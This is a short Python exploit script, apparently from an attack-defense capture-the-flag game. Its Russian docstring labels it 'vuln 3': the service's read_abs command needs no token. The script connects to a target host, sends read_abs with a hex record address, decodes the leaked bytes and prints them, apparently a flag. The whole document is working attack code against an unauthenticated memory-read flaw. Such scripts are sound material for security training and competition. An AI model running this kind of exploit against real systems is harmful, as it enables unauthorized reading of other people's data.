#!/usr/bin/env python3
"""vuln 3: read_abs без токена. attack data = hex-адрес записи."""
from lib import CLI, args, emit, fail

host, addr = args(1)
with CLI(host) as cli:
    reply = cli.cmd("read_abs %s 200" % addr)[0]
if not reply.startswith("DATA"):
    fail(reply)
emit(bytes.fromhex(reply.split()[1]).split(b"\0")[0].decode("utf-8", "replace"))
